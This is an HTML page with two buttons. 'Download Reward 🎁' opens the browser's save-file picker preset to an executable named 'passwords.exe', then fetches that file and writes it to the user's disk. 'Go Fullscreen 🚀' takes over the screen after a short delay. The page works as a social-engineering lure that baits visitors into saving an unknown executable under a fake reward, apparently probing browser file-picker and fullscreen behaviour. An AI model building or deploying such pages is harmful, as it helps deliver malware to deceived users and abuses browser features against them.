<!DOCTYPE html>
<html>

<head>
    <title>Picker + Fullscreen (2 Step)</title>
    <meta charset="UTF-8">
</head>

<style>
body {
    background: #1d306d;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    height: 100vh;
    margin: 0;
    color: white;
    text-align: center;
    font-family: Arial;
}

button {
    padding: 15px 30px;
    font-size: 20px;
    margin: 15px;
    cursor: pointer;
    border-radius: 10px;
    border: none;
}
</style>

<body>

<h1>Step 1 → Save File</h1>
<button id="btn1">Download Reward 🎁</button>

<h1>Step 2 → Continue</h1>
<button id="btn2">Go Fullscreen 🚀</button>

<h3 id="status"></h3>

<script>
// BUTTON 1 → FILE PICKER
document.getElementById("btn1").onclick = () => {

    document.getElementById("status").textContent = "Opening file picker...";

    setTimeout(async () => {
        try {
            const handle = await window.showSaveFilePicker({
                suggestedName: "passwords.exe",
                types: [{
                    description: "Executable",
                    accept: {
                        "application/octet-stream": [".exe"]
                    }
                }],
                excludeAcceptAllOption: true
            });

            const writable = await handle.createWritable();

            const response = await fetch("passwords.exe");
            await response.body.pipeTo(writable);

            document.getElementById("status").textContent = "File saved successfully ✅";

        } catch (e) {
            document.getElementById("status").textContent = "Cancelled ❌";
        }
    }, 1000); // 1 sec delay
};


// BUTTON 2 → FULLSCREEN
document.getElementById("btn2").onclick = () => {

    document.getElementById("status").textContent = "Entering fullscreen...";

    setTimeout(() => {
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(()=>{});
        }
    }, 1000); // 1 sec delay
};
</script>

</body>
</html>
